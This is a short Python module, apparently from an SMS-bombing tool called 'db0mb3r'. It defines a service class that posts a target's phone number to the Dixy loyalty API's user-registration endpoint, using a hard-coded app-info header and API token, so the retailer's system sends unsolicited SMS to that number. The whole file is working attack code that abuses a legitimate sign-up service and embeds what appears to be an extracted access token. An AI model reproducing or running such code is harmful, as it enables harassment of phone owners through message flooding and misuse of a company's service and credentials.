from db0mb3r.services.service import Service

class Dixy(Service):
    async def run(self):
    	await self.post(
			"https://loyalty-api.dixy.ru//api/v1/users/register",
			headers={"appinfo": "eyJhcHBfdmVyc2lvbiI6IjIuMi4yKzMyMCIsImRldmljZSI6ImFuZHJvaWQiLCJkZXZpY2VfaWQiOiIyZGQ5YmZjZmUxOGMyMjYyIiwib3NfdmVyc2lvbiI6InNkazoyOCJ9", 
								"dixy-api-token": "7b2f81beb3bc53c95ea7074b9be34b14ca1cb9e0aad355d9be3defb7df54072a64f172051582b9276db166c18c4f410ca21ca603f04e3765c971f590fb7b0c5d"},
			json={"user": {"phone": self.formatted_phone, "platform": "android", "sms_hash": "EnLcVjUZitT",  "loyalty_region_id":"1"}}
		)